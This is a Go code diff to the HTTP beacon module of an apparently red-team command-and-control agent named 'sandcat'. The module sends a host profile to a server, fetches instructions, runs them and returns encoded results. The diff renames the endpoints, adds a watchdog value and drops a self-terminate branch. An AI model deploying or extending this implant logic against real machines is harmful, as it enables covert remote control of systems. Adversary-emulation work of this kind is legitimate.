@@ -6,7 +6,6 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
-	"os"
 	"path/filepath"
 	"runtime"
 	"strings"
@@ -14,6 +13,11 @@ import (
 	"../execute"
 	"../util"
 	"../output"
+)
+
+var (
+	apiBeacon = "/beacon"
+	apiResult = "/result"
 )
 
 //API communicates through HTTP
@@ -38,7 +42,7 @@ func (contact API) Ping(profile map[string]interface{}) bool {
 //GetInstructions sends a beacon and returns instructions
 func (contact API) GetInstructions(profile map[string]interface{}) map[string]interface{} {
 	data, _ := json.Marshal(profile)
-	address := fmt.Sprintf("%s/instructions", profile["server"])
+	address := fmt.Sprintf("%s%s", profile["server"], apiBeacon)
 	bites := request(address, data)
 	var out map[string]interface{}
 	if bites != nil {
@@ -47,6 +51,7 @@ func (contact API) GetInstructions(profile map[string]interface{}) map[string]in
 		json.Unmarshal(bites, &out)
 		json.Unmarshal([]byte(out["instructions"].(string)), &commands)
 		out["sleep"] = int(out["sleep"].(float64))
+		out["watchdog"] = int(out["watchdog"].(float64))
 		out["instructions"] = commands
 	} else {
 		output.VerbosePrint("[-] beacon: DEAD")
@@ -75,6 +80,8 @@ func (contact API) RunInstruction(command map[string]interface{}, profile map[st
 
 //C2RequirementsMet determines if sandcat can use the selected comm channel
 func (contact API) C2RequirementsMet(profile map[string]interface{}, criteria interface{}) bool {
+	output.VerbosePrint(fmt.Sprintf("Beacon API=%s", apiBeacon))
+	output.VerbosePrint(fmt.Sprintf("Result API=%s", apiResult))
 	return true
 }
 
@@ -102,10 +109,6 @@ func (contact API) SendExecutionResults(profile map[string]interface{}, commandI
 	link := fmt.Sprintf("%s", commandID.(string))
 	data, _ := json.Marshal(map[string]string{"id": link, "output": string(util.Encode(result)), "status": status, "pid": pid})
 	request(address, data)
-	if cmd == "die" {
-		output.VerbosePrint("[+] Shutting down...")
-		util.StopProcess(os.Getpid())
-	}
 }
 
 func request(address string, data []byte) []byte {
